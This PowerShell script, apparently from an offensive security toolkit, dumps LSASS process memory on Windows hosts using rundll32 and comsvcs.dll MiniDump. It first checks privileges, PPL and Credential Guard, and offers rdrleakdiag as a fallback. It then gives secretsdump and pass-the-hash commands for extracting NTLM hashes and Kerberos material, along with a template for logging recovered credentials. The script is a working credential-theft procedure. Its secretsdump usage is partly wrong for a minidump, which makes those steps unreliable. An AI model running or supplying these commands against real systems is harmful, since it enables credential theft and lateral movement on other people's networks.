# gather/windows/lsass-dump.ps1 — LSASS memory dump for domain credential recovery
# Requires: Admin, SeDebugPrivilege
# Read-only: NO — writes a dump file to a staging path on target
# Footprint: Creates dump file on target — remove after pulling to harness
#
# ⚠️  This is an intentionally disruptive credential recovery step.
#     Run ONLY on confirmed compromised hosts within authorized scope.
# ⚠️  Credential Guard / PPL protection will block this on hardened systems —
#     the script detects and reports this before attempting.
# ⚠️  Run collect-evidence.ps1 FIRST if you haven't already.
#
# What this recovers (via secretsdump from harness):
#   - Domain cached credentials (DCC2)
#   - Kerberos tickets / TGTs
#   - WDigest plaintext (if enabled, pre-Win8.1/2012R2)
#   - NTLM hashes for all interactively logged-on users
#
# After pulling dump to harness, run:
#   secretsdump.py -just-dc-user <user> LOCAL -ntds <dump_file>
#   OR: python3 -c "import pypykatz; ..."  (if pypykatz available)
#
# Parameters (set before running):
#   $DumpPath  — where to write the dump (default: C:\Windows\Temp\<random>.dmp)
#
# Usage:
#   <paste>
#   $DumpPath = "C:\Windows\Temp\svc.dmp"; <paste>

$ErrorActionPreference = 'SilentlyContinue'

function Sec($n) { Write-Output "`n=== $n ===" }

if (-not $DumpPath) {
  $rand = [System.IO.Path]::GetRandomFileName() -replace '\..*',''
  $DumpPath = "C:\Windows\Temp\$rand.dmp"
}

Sec 'LSASS DUMP — PRE-FLIGHT'
Write-Output "Timestamp:  $((Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ'))"
Write-Output "Dump path:  $DumpPath"

# Check privilege
$hasDebug = (whoami /priv 2>$null | Select-String 'SeDebugPrivilege') -ne $null
Write-Output "SeDebugPrivilege: $(if ($hasDebug) { 'PRESENT' } else { '[!] ABSENT — dump will likely fail' })"

# Get LSASS PID
$lsassPid = (Get-Process lsass -ErrorAction Stop).Id
Write-Output "LSASS PID:  $lsassPid"

# Check PPL (Protected Process Light)
$ppLevel = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -ErrorAction SilentlyContinue).RunAsPPL
if ($ppLevel -eq 1) {
  Write-Output "[!] LSASS PPL protection: ENABLED (RunAsPPL=1)"
  Write-Output "    comsvcs.dll MiniDump will be BLOCKED by PPL."
  Write-Output "    Options:"
  Write-Output "      - Use secretsdump.py remotely from harness (no dump needed):"
  Write-Output "        secretsdump.py -hashes :<ntlm> <domain>/<user>@<target>"
  Write-Output "      - PPL bypass requires driver or Kernel-level access (out of scope for LOTL)"
  Write-Output "    Stopping."
  exit 1
} elseif ($ppLevel -eq 2) {
  Write-Output "[!] LSASS PPL: UEFI-locked (RunAsPPL=2) — dump will fail"
  exit 1
} else {
  Write-Output "LSASS PPL:  not enabled (RunAsPPL=$ppLevel) — proceeding"
}

# Check Credential Guard
$cgRunning = Get-Service -Name LsaIso -ErrorAction SilentlyContinue
if ($cgRunning -and $cgRunning.Status -eq 'Running') {
  Write-Output "[!] Windows Credential Guard (LsaIso) is RUNNING"
  Write-Output "    Plaintext and Kerberos material will be protected by the VSM."
  Write-Output "    NTLM hashes may still be recoverable."
}

Sec 'LSASS DUMP — comsvcs.dll MiniDump (LOLBAS)'
# This is a native Windows technique — no binary upload required.
# rundll32 is already present; comsvcs.dll is a system DLL.
Write-Output "Running: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $DumpPath full"
$result = & rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $DumpPath full 2>&1
Write-Output "rundll32 exit: $LASTEXITCODE"

Sec 'VERIFY — DUMP FILE'
if (Test-Path $DumpPath) {
  $size = (Get-Item $DumpPath).Length
  Write-Output "[OK] Dump file created: $DumpPath ($([math]::Round($size/1MB, 1)) MB)"
  Write-Output "Hash: $((Get-FileHash $DumpPath -Algorithm SHA256).Hash)"
} else {
  Write-Output "[FAIL] Dump file not found at $DumpPath"
  Write-Output "       Try alternative: rdrleakdiag /p $lsassPid /o C:\Windows\Temp /fullmemdmp /wait 1"
  exit 1
}

Sec 'NEXT STEPS — PULL AND ANALYSE FROM HARNESS'
Write-Output @"

1. Pull the dump file to harness:
   # Copy via your remote_exec session — base64 encode in chunks or use SMB/SCP

2. Extract credentials from harness (do NOT run Mimikatz on target):
   secretsdump.py -system SYSTEM -security SECURITY LOCAL -ntds $DumpPath

   # Or against a live target with recovered hash (no dump needed):
   secretsdump.py -hashes :<ntlm-hash> <domain>/<user>@<target-ip>

3. Record recovered credentials:
   intel_add(category="credential", id="<id>",
     data="type: ntlm-hash\nusername: <user>\nsecret: <hash>\nstatus: active\nsource:\n  host: <this-host>\n  method: lsass-dump\n  playbook: windows/lsass-dump.ps1",
     summary="<user> NTLM recovered from LSASS dump")

4. REMOVE the dump file when done:
   Remove-Item -Path "$DumpPath" -Force
   # Confirm removal:
   Test-Path "$DumpPath"   # expect: False
"@
